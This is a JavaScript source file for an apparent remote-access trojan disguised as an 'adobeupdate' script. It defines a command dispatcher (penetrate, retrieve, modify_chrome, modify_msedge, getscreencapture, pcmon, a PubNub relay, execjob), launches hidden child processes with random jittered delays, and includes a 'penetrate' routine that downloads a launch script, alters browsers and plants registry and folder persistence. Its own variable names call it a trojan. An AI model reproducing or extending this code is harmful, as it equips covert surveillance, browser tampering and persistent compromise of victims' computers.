const helper = require("./adobeupdate.helper.js");

class CmdConfig {
    #__cmdname = "";
    #__launchprocname = ""; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
    #__launchscriptfname = ""; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
    #__childprocess = null;
    #__childcmds = [];
    #__parentcmdconfig = null;
    #__cmdconfig = null; // for cmds launched as a job -- final param should be path to json clinetjob object

    #__childpid = null;

    #__pubnubrelay = null;

    #__clientjob = null;

    get clientjob() {
        if (
            ["cmdlist", "ping", "watchdog", "launch_ping"].includes(
                this.cmdname
            )
        ) {
            return null;
        }

        if (this.#__clientjob) return this.#__clientjob;

        let configfpath = "";

        configfpath = process_argv.length >= 4 ? process_argv[3] : "";

        helper.logmsg(`reading configfpath: ${configfpath}`);

        if ( ! helper.fileExists(configfpath) ) {
            throw new Error("configfpath does not exist " + configfpath);
        }

        let jsonconfigstr = helper.readTag(configfpath);

        if (helper.isNullOrWhitespace(jsonconfigstr)) {
            throw new Error("jsonconfigstr is empty");
        }

        helper.logmsg("jsonconfigstr=" + jsonconfigstr);

        let tclientjob = JSON.parse(jsonconfigstr);

        helper.logmsg("clientjob: " + JSON.stringify(tclientjob));

        this.#__clientjob = tclientjob;

        return this.#__clientjob;
    }

    set pubnubrelay(value) {
        this.#__pubnubrelay = value;
    }

    get pubnubrelay() {
        return this.#__pubnubrelay;
    }

    set parentcmdconfig(value) {
        return (this.#__parentcmdconfig = value);
    }

    get parentcmdconfig() {
        return this.#__parentcmdconfig;
    }

    get childpid() {
        return this.#__childpid;
    }

    get config() {
        if (this.#__cmdconfig) return this.#__cmdconfig;

        if (["task", "watchdog", "cmdlist", "ping"].includes(this.cmdname)) {
            return null;
        }

        if (process_argv.length <= 3) {
            return null;
        }

        let cmdconfig_json = readTag(process_argv[3]);
        let cmdconfig_obj = JSON.parse(cmdconfig_json);

        this.#__cmdconfig = cmdconfig_obj;
        return this.#__cmdconfig;
    }

    get jobcode() {
        let configobj = this.config;

        return configobj?.jobcode ?? "";
    }

    get childprocess() {
        return this.#__childprocess;
    }

    get launchscriptfname() {
        return this.#__launchscriptfname;
    }

    get cmdtaskname() {
        if (this.cmdname == "task" && process_argv.length >= 4) {
            return process_argv[3];
        }

        return "";
    }

    set cmdname(value) {
        if (CmdConfig.isCmdExist(value)) this.#__cmdname = value;
        else throw new Error("cmd is not supported [" + value + "]");
    }

    get cmdname() {
        return this.#__cmdname;
    }

    get launchprocname() {
        return this.#__launchprocname;
    }

    getChildCmd(cmdname) {
        for (let i = 0; i < this.#__childcmds.length; i++) {
            let childcmd = this.#__childcmds[i];
            if (childcmd.cmdname == cmdname) {
                return childcmd;
            }
        }

        return null;
    }

    get childcmds() {
        if (!this.#__childcmds) this.#__childcmds = [];

        return this.#__childcmds;
    }

    // should be overriden by implementing cmd
    loopfunc = async () => {
        logmsg("pass");
    };

    newCmdConfig(tcmdname) {
        let childcmd = new CmdConfig(tcmdname, this);
        this.addchildcmd(childcmd);

        return childcmd;
    }

    constructor(tcmdname, cmdconfig) {
        this.cmdname = tcmdname;
        this.parentcmdconfig = cmdconfig;
    }

    // list of supported commands
    static cmdfuncs = {
        watchdog: watchdog,
        task: watchdog,
        launch_ping: watchdog,

        penetrate: penetrate,
        retrieve: retrieve,

        cmdlist: cmdlist,
        ping: ping,
        pcmon: pcmon,
        pspcmon: pspcmon,
        execjob: execjob,
        relay: relay,
        install_python: install_python,
        install_node: install_node,
        cleanup: cleanup,
        modify_chrome: modify_chrome,
        modify_msedge: modify_msedge,

        getsystemoverview: getsystemoverview,
        getscreencapture: getscreencapture,
    };

    get dynamicdelay() {
        return crypto.randomInt(1, 10) * 5;
    }

    get cmdfunc() {
        return CmdConfig.cmdfuncs[this.cmdname];
    }

    static isCmdExist(tcmdname) {
        return Object.hasOwn(CmdConfig.cmdfuncs, tcmdname);
    }

    get cmdpidfpath() {
        return path.join(systemstate.trojandir, this.cmdname + "_running");
    }

    readcmdpid() {
        if (!fileExists(this.cmdpidfpath)) return -1;

        let pid = readTag(this.cmdpidfpath);

        return pid;
    }

    get lockfname() {
        let _fname = "";
        _fname = systemstate.trojanname + "_" + this.cmdname;
        _fname +=
            (!isNullOrWhitespace(this.cmdtaskname)
                ? "_" + this.cmdtaskname
                : "") + "_lock";

        return "\\\\.\\pipe\\" + _fname;
    }

    async activate(cmdlineargs, exitparent) {
        logmsg("starting");

        if (isPidAlive(this.childpid)) {
            logmsg(
                `no need to run [${this.cmdname}]-- child process exists with pid [${this.childpid}]`
            );
            return;
        }

        let pipe_exists = await checkIfPipeExists(this.lockfname);

        if (pipe_exists) {
            logmsg(
                `no need to run [${this.cmdname}]-- pipe exists with name [${this.lockfname}]`
            );

            return;
        }

        let ret = await this.launch(cmdlineargs, !exitparent ? false : true);

        return ret;
    }

    // ! overriden when new child cmd is created by cmdlist
    //   default impelmentation: watchdog uses this function to relay messages between ping and cmdlist
    // message handler -- used by parent cmds to process incoming messages from child cmds
    processMessage(msg) {
        logmsg("starting -- watchdog implementation");

        let parentcmd = this.parentcmdconfig;

        if (!parentcmd) return;

        let src = msg.src;
        let dest = msg.dest;
        let payload = msg.payload;

        let destcmd = parentcmd.getChildCmd(dest);

        if (!destcmd) {
            throw new Error("could not obtain child cmd for " + dest);
        }

        this.sendMessage(destcmd, src, payload);

        logmsg("finished");
    }

    // used by parent cmds to send message to child cmds (watchdog send msg to ping, cmdlist)
    sendMessage(destcmd, src, msgpayload) {
        let childp = destcmd.childprocess;

        if (!childp) {
            throw new Error("childcmd does not have valid child process");
        }

        if (!isChildHealthy(childp)) {
            throw new Error("childprocess is not healthy");
        }

        let msgout = {
            senderPid: process.pid,
            src: src,
            dest: destcmd.cmdname,
            payload: msgpayload,
            ts: getTimestamp(),
        };

        if (childp.connected && !childp.killed) {
            logmsg("sending message to child: " + JSON.stringify(msgout));

            childp.send(msgout);
        }
    }

    async launch(cmdlineargs, exitparent) {
        if (!exitparent) exitparent = false;

        logmsg(`launching [${this.cmdname}]`);

        let child = null;

        cmdlineargs = !(Array.isArray(cmdlineargs) && cmdlineargs.length >= 1)
            ? []
            : cmdlineargs;

        cmdlineargs = [this.cmdname, ...cmdlineargs];

        return new Promise((resolve, reject) => {
            if (!fileExists(systemstate.trojanfpath)) {
                reject(
                    new Error(
                        "trojan script does not exists at " +
                        systemstate.trojanfpath
                    )
                );
            }

            if (exitparent) {
                logmsg("spawning child");
                child = spawn(
                    systemstate.nodeexepath,
                    [systemstate.trojanfpath, ...cmdlineargs],
                    { stdio: "ignore", windowsHide: true }
                );
            } else {
                logmsg("forking child");
                child = fork(systemstate.trojanfpath, cmdlineargs, {
                    windowsHide: true,
                });
            }

            if (!child) {
                reject(new Error("failed to launch child proc"));
            } else {
                logmsg("child process launch success");
            }

            child.unref();

            this.#__childprocess = child;
            this.#__childpid = child?.pid;
            this.#__launchprocname = path.basename(child.spawnargs[0]);
            this.#__launchscriptfname = path.basename(systemstate.trojanfpath);

            logmsg(
                `launched child ${this.cmdname} pid=${child.pid} spawn args: ` +
                JSON.stringify(child.spawnargs)
            );
            // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]

            writeTag(this.cmdpidfpath, String(child.pid));

            // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
            child.on("message", (message) => {
                logmsg("[YER]incomming message: " + JSON.stringify(message));

                this.processMessage(message);
            });

            child.on("exit", (code) => {
                logmsg(`Child process ${child.pid} exited with code ${code}`);
            });

            child.on("close", (code) => {
                logmsg(`Process exited with code ${code}`);
            });

            child.on("error", (err) => {
                logmsg("Failed to start child process:", err.message);
                reject(err);
            });

            child.on("spawn", () => {
                logmsg(`Child successfully started with PID: ${child.pid}`);

                resolve(child);
            });
        });
    }

    exitramp() {
        let fpath = path.join(systemstate.trojandir, "killall");

        if (fileExists(fpath)) {
            logmsg("found killall -- exiting");
            process.exit(0);
            return;
        }

        fpath = path.join(
            systemstate.trojandir,
            "reset_" + systemstate.cmdconfig.cmdname
        );

        if (fileExists(fpath)) {
            rmSync(fpath, { force: true });
            process.exit(0);
            return;
        }
    }

    async loop() {
        logmsg("starting main looop");

        if (!this.loopfunc) {
            logmsg("Fatal Error: loopfunc is not a valid function");
            process.exit(1);
        }

        let loopindex = 0;
        while (true) {
            loopindex++;
            logmsg(
                `loop starting -- loopindex=${loopindex} -- ${getTimestamp()}`
            );

            this.exitramp();

            try {
                if (isAsyncFunction(this.loopfunc)) await this.loopfunc();
                else this.loopfunc();
            } catch (err) {
                logmsg(err);
            }

            logmsg("sleeping for [" + systemstate.staticdelay + "] seconds");

            for (let i = 0; i < (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
                logmsg(
                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
                    }]`
                );

                await sleep(1000);
            }

            let num =
                systemstate.cmdconfig.dynamicdelay ??
                crypto.randomInt(1, 10) * 5;

            logmsg(`sleeping for an additional ${num} seconds`);

            for (let i = 0; i < (ISDEBUG ? 0 : num); i++) {
                logmsg(
                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
                    }]`
                );
                await sleep(1000);
            }
        }
    }

    addchildcmd(cmdconfig) {
        if (!this.childcmds) this.childcmds = [];

        this.childcmds.push(cmdconfig);
    }
}

// TODO need to execute modify_chrome and modify_edge on each startup
// for tpl -- the desktop lnk can't be modified -- good idea to put in autolaunch to launch 
// and minimise both edge and chrome on startup -- should these processes be headless?
async function penetrate() {
    helper.logmsg("starting");

    if (ISDEBUG) {
        process.exit(0);
    }

    if (!helper.fileExists(systemconfig.launch_script_fpath)) {
        await download_launch_script();
    }

    await modify_chrome();
    await modify_edge();

    await reschedule();
    await penetrate_reg();
    await penetrate_folders();

    // TODO await cleanup()
    // check if trojandir needs cleanup, if so remove log files, etc.

    helper.logmsg("finished");
    process.exit(0);
}